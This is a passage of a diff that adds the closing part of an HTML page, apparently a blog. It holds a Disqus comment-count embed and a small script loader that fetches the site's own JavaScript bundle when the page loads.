+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
